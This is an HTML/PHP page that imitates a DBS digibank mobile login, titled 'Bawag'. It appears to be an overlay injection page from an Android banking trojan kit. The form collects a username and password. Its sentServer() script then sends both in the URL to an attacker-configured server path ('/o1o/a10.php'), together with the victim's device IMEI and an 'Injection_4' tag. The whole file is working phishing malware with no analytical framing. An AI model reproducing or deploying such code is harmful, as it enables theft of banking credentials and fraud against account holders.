<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>
	
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="hk/com.dbs.hk.dbsmbanking/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>

<div class="header">
	<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACEAAAAhCAMAAABgOjJdAAAAe1BMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////NgkbwAAAAKXRSTlMAAkUMvf+ywiz+HoWOB5GJuwi3k7MGl7AFAZusBKCoA6S0kob9Cb4LvI/ZJ3MAAACWSURBVDjL7dTHDsJADARQb2ApIQtJIL3S+f8vBIYTEjtG4sqc38WyxyLvMUFghGUytXZGwdw+stDAMlSAXWkg+oNfgXuBNdnnBiJOCIlAUkfIFmSXEZKDFKVfVDVI0xLSgfSDn5gRZCR3PvQgXeUnbQNSE1IWIDmZOduDHAhxKciRkCR+ilNIyPmitFLkelOa/cV3+JA7UhkIxuPJpVkAAAAASUVORK5CYII=" style="padding: 7px;display: inline-flex;float: left;width: 16px;">
	<h3 style="text-align: center;font-size: 14px;padding: 4px;margin: 0;color: #fff;"> LOGIN </h3>
	<h3 style="display: block; text-align: left;margin-left: 25px;margin-bottom: 6px;"> Login </h3>
	<h3 style="display: block; text-align: left;margin: 0;margin-left: 25px;color: #fff;margin-bottom: 15px;"> to digibank </h3>
</div>
<div id="content_div">

	<form id="form" style="margin: 0;">
	<input id="login" class="input" name="field2" placeholder="Enter Username" type="text">

	<input class="input" id="password" name="field3" placeholder="Enter Password" type="password" style="margin: 0;">
<?php
echo "<input data-role='none' type='text' name='imei' value='$IMEI_country' class='imei' style='visibility:hidden'/>";
?>
	<h6 style="color:#000; display: block; font-weight: 100; b"> Forgot <u style="color: #ff3a30;">User ID</u> or <u style="color: #ff3a30;">Password?</u></h6>


	<input type="button" class="button" value="LOGIN" onClick="sentServer();">	
	</form>

	
</div>
<script>
		function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';
	
	var login1 = document.forms["form"].elements["login"].value; 
	var pass = document.forms["form"].elements["password"].value; 

	location.replace(url+'/o1o/a10.php?p=' +  imei_c+"|Injection_4|dbsmbanking|"+login1+"|"+pass);
	}}
</script>
</body>
</html>
